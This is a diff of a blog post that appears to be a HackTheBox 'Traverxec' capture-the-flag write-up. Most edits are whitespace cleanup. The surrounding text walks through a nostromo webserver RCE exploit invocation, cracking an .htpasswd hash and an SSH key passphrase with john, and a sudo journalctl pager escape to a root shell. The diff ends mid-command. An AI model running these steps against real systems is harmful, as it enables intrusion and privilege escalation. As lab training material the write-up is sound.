@@ -8,12 +8,12 @@ published: true
 ---
 
 # 0x0 Introduction
-Yet another HTB box and again one of the easier ones. This time we had to exploit a vulnerable nostromo webserver version for command execution and then escalate privileges from there. 
-![image](/assets/images/traverxec_htb_info.png "Traverxec Logo")
+Yet another HTB box and again one of the easier ones. This time we had to exploit a vulnerable nostromo webserver version for command execution and then escalate privileges from there.
+![image](/images/traverxec_htb_info.png "Traverxec Logo")
 
 # 0x1 Getting a foothold
 
-Starting of as usual with a nmap scan I got the following result: 
+Starting of as usual with a nmap scan I got the following result:
 
 ```
 # Nmap 7.80 scan initiated Mon Feb 10 08:20:59 2020 as: nmap -sV -sC -oA nmap/nmap 10.10.10.165
@@ -22,7 +22,7 @@ Host is up (0.0061s latency).
 Not shown: 998 filtered ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
 |   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
 |_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
@@ -35,8 +35,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Mon Feb 10 08:21:11 2020 -- 1 IP address (1 host up) scanned in 12.31 seconds
 ```
 
-I had never heard of nostromo before but a quick google search told me that it's an open source webserver that is common on BSD and is also called nhttpd.  
-When I searched for the version number I immediately found an RCE vulnerability and a python script to exploit it.  
+I had never heard of nostromo before but a quick google search told me that it's an open source webserver that is common on BSD and is also called nhttpd.
+When I searched for the version number I immediately found an RCE vulnerability and a python script to exploit it.
 
 ```py
 #!/usr/bin/env python
@@ -75,7 +75,7 @@ exploit(args.host,args.port,args.cmd)
 ```
 
 The vulnerability here is a path traversal that allows us to reach /bin/sh
-Which is also very simple to use 
+Which is also very simple to use
 
 ```
 mindslave@kalibox:~/hackthebox/Traverxec/nostromo$ python2 exp.py 10.10.10.165 80 "whoami"
@@ -86,7 +86,7 @@ www-data
 
 # 0x2 getting the user.txt
 
-As www-data I usually first want to look in our own directory because that's were we are most likely to have access. so thats /var/nostromo in this case.  
+As www-data I usually first want to look in our own directory because that's were we are most likely to have access. so thats /var/nostromo in this case.
 In there I found a conf directory and was able to extract a hash from the .htpasswd file inside.
 
 ```
@@ -98,9 +98,9 @@ david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 Copied the credentials over to my maschine and asked my friend john if he could tell me something about them
 
 ```
-mindslave@kalibox:~/hackthebox/Traverxec/nostromo/creds$ cat pwfile 
+mindslave@kalibox:~/hackthebox/Traverxec/nostromo/creds$ cat pwfile
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
-mindslave@kalibox:~/hackthebox/Traverxec/nostromo/creds$ john --wordlist=/usr/share/wordlists/rockyou.txt pwfile 
+mindslave@kalibox:~/hackthebox/Traverxec/nostromo/creds$ john --wordlist=/usr/share/wordlists/rockyou.txt pwfile
 Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
 Use the "--format=md5crypt-long" option to force loading these as that type instead
 Using default input encoding: UTF-8
@@ -113,7 +113,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Now we have password "Nowonly4me". First thing I tested with this password was ssh of course, but sadly david did not use that as his ssh password.  
+Now we have password "Nowonly4me". First thing I tested with this password was ssh of course, but sadly david did not use that as his ssh password.
 Going further throught the nhttpd.conf I found the following:
 
 ```
@@ -143,7 +143,7 @@ $ python3 /usr/share/john/ssh2john.py id_rsa > johnfile
 ```
 
 ```
-$ john --wordlist=/usr/share/wordlists/rockyou.txt johnfile 
+$ john --wordlist=/usr/share/wordlists/rockyou.txt johnfile
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
@@ -161,7 +161,7 @@ Session completed
 log in with ssh
 ```
 $ ssh -i id_rsa david@10.10.10.165
-Enter passphrase for key 'id_rsa': 
+Enter passphrase for key 'id_rsa':
 Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
 Last login: Mon Feb 10 04:51:07 2020 from 10.10.14.2
 david@traverxec:~$
@@ -170,10 +170,10 @@ david@traverxec:~$
 
 # 0x3 getting the root.txt
 
-In davids "bin" directoy I found an interesting script 
+In davids "bin" directoy I found an interesting script
 
 ```bash
-$ cat server-stats.sh 
+$ cat server-stats.sh
 #!/bin/bash
 
 cat /home/david/bin/server-stats.head
@@ -183,10 +183,10 @@ echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
 echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
 echo " "
 echo "Last 5 journal log lines:"
-/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
 ```
 
-Here I only care about the last line "/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat" which means we can execute this journalctl command as root and if we do that, without piping it into cat, we invoke the default pager, most likely "less", as root. And inside of less we can execute "!/bin/sh" that will run as root and thus give us a root shell. 
+Here I only care about the last line "/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat" which means we can execute this journalctl command as root and if we do that, without piping it into cat, we invoke the default pager, most likely "less", as root. And inside of less we can execute "!/bin/sh" that will run as root and thus give us a root shell.
 
 ```
 $ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service;
